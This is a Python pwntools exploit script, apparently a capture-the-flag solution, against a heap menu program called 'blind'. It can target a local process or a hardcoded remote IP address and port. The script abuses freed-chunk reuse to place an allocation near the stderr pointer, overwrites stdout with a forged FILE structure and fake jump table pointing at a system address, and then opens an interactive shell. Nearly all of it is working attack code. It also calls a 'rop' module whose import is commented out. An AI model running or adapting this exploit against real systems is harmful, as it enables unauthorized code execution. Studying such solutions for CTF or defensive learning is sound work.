from pwn import *
from ctypes import *
import os
#import roputils as rop

remote_addr = "106.75.20.44"
remote_port = 9999

local_addr = "127.0.0.1"
local_port = 1807

pc = "./blind"
pwn_elf = ELF(pc)
pwn_rop = rop.ROP(pc)

uselibc = 2 #0 for no,1 for i386,2 for x64
local = 1
haslibc = 1
atta = 0

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		gdb.attach(p,'b *0x400a23\n b*0x400b1e')


def sla(a,b):
	p.sendlineafter(a,b)

def sa(a,b):
	p.sendafter(a,b)

def ru(a):
	p.recvuntil(a)

def rv(a):
	return p.recv(a)


def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def new(idx,content):
	sla('Choice:','1')
	sla('Index:',str(idx))
	sla('Content:',content)

def change_line(idx,content):
	sla('Choice:','2')
	sla('Index:',str(idx))
	sla('Content:',content)

def change(idx,content):
	sla('Choice:','2')
	sla('Index:',str(idx))
	sa('Content:',content)


def release(idx):
	sla('Choice:','3')
	sla('Index:',str(idx))

def hack():
	raw_input()
	new(0,'aaaa')
	new(1,'bbbb')

	release(0)
	stderr_addr = pwn_elf.symbols['stderr']
	stdout_addr = pwn_elf.symbols['stdout']
	puts_got = pwn_elf.got['puts']
	puts_plt = pwn_elf.plt['puts']
	system_addr = 0x4008e3
	fake_stdout = 0x602200

	lg('stderr_addr',stderr_addr)
	payload = p64(stderr_addr - 3)
	change_line(0,payload)
	
	new(2,'aaaa')
	new(3,'aaaa')
	payload = '\x00'*(0x60-0x4d) + p64(stdout_addr) + p64(fake_stdout) + p64(fake_stdout+0x68) + p64(fake_stdout+0x68*2)
	change_line(3,payload)

	payload = p64(0xfbad2885)
	payload += p64(0) + p64(0) + p64(0)
	payload += p64(0) + p64(0) + p64(0)
	payload += p64(0) + p64(0)
	payload += p64(0)*4
	change(1,payload)

	payload = p64(0)
	payload += p64(1)
	payload += p64(0xffffffffffffffff) + p64(0) + p64(0x602000)
	payload += p64(0xffffffffffffffff) + p64(0)
	payload += p64(0x602000) + p64(0)*3
	payload += p64(0xffffffff) + p64(0)
	change(2,payload)

	fake_jump_table = fake_stdout + 0x68*2 + 0x10
	payload = p64(0) + p64(fake_jump_table)
	payload += p64(0)*2 + p64(system_addr)*6
	change_line(3,payload)

	payload = p64(fake_stdout)
	change_line(0,payload)

	#change_line(0,'a')

	p.interactive()
hack()